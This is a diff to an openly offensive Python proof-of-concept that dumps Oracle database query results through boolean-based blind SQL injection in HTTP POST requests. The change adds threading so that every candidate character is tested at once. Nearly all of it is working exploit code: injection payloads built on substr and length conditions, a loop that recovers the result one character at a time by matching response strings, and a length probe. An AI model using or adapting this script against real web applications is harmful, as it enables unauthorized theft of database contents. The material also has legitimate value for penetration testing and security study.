@@ -1,7 +1,10 @@
 ################################################################################################
 #  Description:  
-#  A rough HTTP POST based POC for dumping results from an Oracle database using boolean based
-#  SQL injection.
+#  A rough threaded HTTP POST based POC for dumping results from an Oracle database 
+#  using boolean based SQL injection. 
+#
+#  Note:  Sometimes nested queries have issues if the Oracle database can't handle a large
+#  number of queries being run in parallel.
 #
 #  Author: b0yd
 #
@@ -9,6 +12,8 @@
 
 import requests
 import urllib
+from threading import Thread
+import sys
 import time
 
 proxies = None
@@ -21,35 +26,43 @@ proxies = {
 #Example User Agent string
 headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0',
            'Content-Type':'application/x-www-form-urlencoded'}
-           
+
 #Set to bypass errors if the target site has SSL issues
 requests.packages.urllib3.disable_warnings()
-
-#Set this to the parameter name for the POST request
-post_param_name = "param1"
 
 #Target URL
 url = "https://example.com/vulnerable_page.html"
 
 #Set this to the expected string in the returned page that indicates the query ran sucessfully
-success_str = "10 results"
+success_str = "2325 matches"
+
+#Set this to the error string that is in the return page if the SQL query has an error
+exception_str = "exception"
+
+#Set this to the parameter name for the POST request
+post_param_name = "param1"
+
+#SQL query to execute
+query = "select user from dual"
 
 #Set this to the beginning ascii ordinal value, ie 41=A
 begin_num = 32
 #Set this to the end ascii ordinal value, ie 41=A
 end_num = 127
 
-#SQL query to execute
-query = "select user from dual"
+threads = [None] * (end_num - begin_num)
+results = [None] * (end_num - begin_num)
 
 #Can be used to find the length of the returned SQL string
 def get_str_length(query):
 
-  for i in range(0, 1000):
+  for i in range(1, 300):
     data = "' or 1=1 and length((%s))=%d--" % (query, i)
     ret = make_request(url, data)
     if success_str in ret:
       return i
+    elif exception_str in ret:
+      break
     else:
       continue
 
@@ -65,47 +78,41 @@ def make_request( addr, data ):
   return r.text
 
 #Read file
-def get_string(str_len, query, start_ord, end_ord):
+def get_string(cur_str, counter, num, query, results):
 
-  full_str = ''
-  counter = 1
-  while( len(full_str) < str_len ):
+  letter = cur_str + chr(num + begin_num)
+  data = "' or 1=1 and substr((%s),1,%s)='%s'--" % (query, counter, letter)
+  ret = make_request(url, data)
+  if success_str in ret:
+    results[num] = 1
+  else:
+    results[num] = 0
 
-    letter_found = False
-    num = start_ord
-    while( num < end_ord):
-      letter = full_str + chr(num)
-      data = "' or 1=1 and substr((%s),1,%s)='%s'--" % (query, counter, letter)
-      ret = make_request(url, data)
-      if success_str in ret:
-        full_str += chr(num)
-        counter += 1
-        letter_found = True
-        break
-      elif "unavailable" in ret:
-        time.sleep(1)
-        continue
-      elif "exception" in ret:
-        print "[-] SQL syntax error"
-        break
-      else:
-        num += 1
-
-
-    if letter_found == False:
-      print "[-] Letter not found. Exiting"
-      break
-
-  return full_str
-  
+    
 #Print the query
 print "[+] Running query: '%s'" % query
-str_len = 100000
 
-#Uncomment below to find the SQL return length before trying to get the actual value
-#str_len = get_str_length(query)
+j = 1
+cur_str = ''
+while 1:
 
-print "[+] Length: %d" % str_len
-if str_len > 0:
-    user = get_string(str_len, query, begin_num, end_num)
-    print "[+] Result: %s" % user
+  for i in range(len(threads)):
+    threads[i] = Thread(target=get_string, args=(cur_str, j, i, query, results))
+    threads[i].start()
+
+  #Wait for each to finish
+  for i in range(len(threads)):
+       threads[i].join()
+
+  try:
+    winner = results.index(1)
+  except:
+    print "[-] No letter found. Exiting"
+    break
+    
+  #print "[+] Winning letter: %s" % chr(winner + begin_num)
+  cur_str += chr(winner + begin_num)
+  time.sleep(0.1)
+  j += 1
+
+print "[+] Result: %s" % cur_str
